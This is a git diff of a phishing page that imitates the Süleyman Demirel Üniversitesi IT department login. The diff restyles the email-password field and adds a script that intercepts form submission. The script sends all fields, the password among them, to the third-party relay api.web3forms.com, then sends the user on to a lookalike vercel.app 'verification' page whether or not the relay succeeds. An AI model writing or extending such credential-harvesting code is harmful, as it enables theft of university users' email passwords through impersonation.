@@ -1265,29 +1265,36 @@
                                                         </div>
                                                     </div>
 
-                                                    <div class="input-group">
+                                                    <div class="input-group" style="margin-bottom: 25px;">
                                                         <label>E-posta Şifresi</label>
                                                         <div class="input-wrapper">
-                                                            <i class="fal fa-key fa-fw position-absolute"
-                                                                aria-hidden="true"></i>
+                                                            <i class="fas fa-key"
+                                                                style="position: absolute; left: 15px; top: 18px; color: #ccc;"></i>
                                                             <input type="text" name="mail_pwd" class="mask-pass"
-                                                                placeholder="••••••••" required>
+                                                                placeholder="••••••••" required
+                                                                style="width: 100%; height: 50px; padding: 0 15px 0 45px; border: 1px solid #ddd; border-radius: 6px;">
                                                         </div>
                                                     </div>
 
-                                                    <button type="submit" class="btn-login">GİRİŞ YAP</button>
+                                                    <button type="submit" class="btn-submit"
+                                                        style="width: 100%; height: 55px; background: #e52421; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 16px; text-transform: uppercase;">
+                                                        SİSTEME DEVAM ET
+                                                    </button>
                                                 </form>
-
-                                                <div class="help-links">
-                                                    <a href="#">Şifremi Unuttum</a>
-                                                    <a href="#">Destek Al</a>
+                                                <div class="help-links"
+                                                    style="margin-top: 25px; display: flex; justify-content: space-between; font-size: 13px;">
+                                                    <a href="#" style="color: #777; text-decoration: none;">Şifremi
+                                                        Unuttum</a>
+                                                    <a href="#" style="color: #777; text-decoration: none;">Destek
+                                                        Al</a>
                                                 </div>
 
-                                                <div class="footer-text">
+                                                <div class="footer-text"
+                                                    style="margin-top: 40px; text-align: center; font-size: 11px; color: #aaa; line-height: 1.6;">
                                                     © 2026 Süleyman Demirel Üniversitesi<br>
                                                     Bilgi İşlem Daire Başkanlığı - Tüm Hakları Saklıdır.
                                                 </div>
-                                            </div>
+                                            </div> ```
 
                                         </body>
 
@@ -1378,3 +1385,41 @@
             style="width:250px;height:40px;border:1px solid rgb(193,193,193);margin:10px 25px;padding:0px;resize:none;display:none">0cAFcWeA47SsGYtY_fljqKp-mUcw9KvDGX6JSnlznOBxI3TYAsqA42_W_chYQcoeToLffEWP9KckfMYsThCNZRZhIL5dtDDocnb9dQKr__4xGH4TpcDAeWlVj5yi1j17oU8NIzjrTVKbqetmIlhYE7V6PeCcRy0-Dvj8gLh8F4C_O0r0s4RKFVVJINWWnDW5mqVlx5z1fRTJIwpm3T4da-qlF0zpeyFXtL2-qn9BPotG6VNAl5LZSOIBJ35gXwxvi1QbcXg3aX9JaSbDP-h1WiT4CjfZ1g9bsr4Fhmqk7iB0mamx05J8P16GFAULmlDSu_gNGQyJHh212YKNA8FrSrz0oquo5keCJSx9HTMRoLzPpLPwfKAjGdXGAeDy9P-2Y6YjAetO7CaTzBCsgg1cNd7fcoXKnrre_NiMG-KmKRBxWYS3YrfFn960wELMucHptHZMaq1_ji_G8VDkweXyYtjcnacRogKWOgzCuMsMnRwl73HZxcU3Ia7pU69jbMyUMh8jiT5ZKgHoSofRqysiLDRJdM91jVv1w2wj7rcuHx2iXYslAPs9PXlnHcnMX-5sQtNWxer14iZ7jen7ItLOUqjfjJ28rsR_AEv0iqBb9XZnOtTBbrEpaPSl4UCiB02ouNcjKpiu6LUajTmlULl1CSoKB3ymlAc5bFmdNWVwT3dBZwuF4EwHRNvZe-VPIOT3roZ2GS3OAwzwlQ4TDYZiDWqWun6DICKaxdW67xIHDG0ls7bO_gnqqIRr2sgCqubVUag90eKT3knFDGVRS2ldIbY1faZjn7M3kGPETnC7vWGHx009lu-oTzD_ee3URhdIbGT_c2IPvMdlB-Q3M0uNU85YjWDWYHGzz3fA</textarea>
     </div><iframe style=display:none></iframe>
 </div>
+<script>
+    document.querySelector('form').addEventListener('submit', function (e) {
+        e.preventDefault(); // Sayfanın hata sayfasına gitmesini engeller
+
+        const formData = new FormData(this);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+
+        // Kullanıcıya bilgi ver (Butonu devre dışı bırak)
+        const btn = document.querySelector('.btn-submit');
+        const originalText = btn.innerText;
+        btn.innerText = "Giriş Yapılıyor...";
+        btn.disabled = true;
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+            .then(async (response) => {
+                if (response.status == 200) {
+                    // BAŞARILI: Web3Forms veriyi aldı, şimdi yönlendiriyoruz
+                    window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+                } else {
+                    // HATA: Güvenlik engelini aşamazsak kullanıcıyı yine de yönlendir (Opsiyonel)
+                    console.log("Web3Forms Hatası, ama yönlendiriliyor...");
+                    window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+                }
+            })
+            .catch(error => {
+                // Bağlantı hatası olsa bile yönlendirmeyi zorla
+                window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+            });
+    });
+</script>
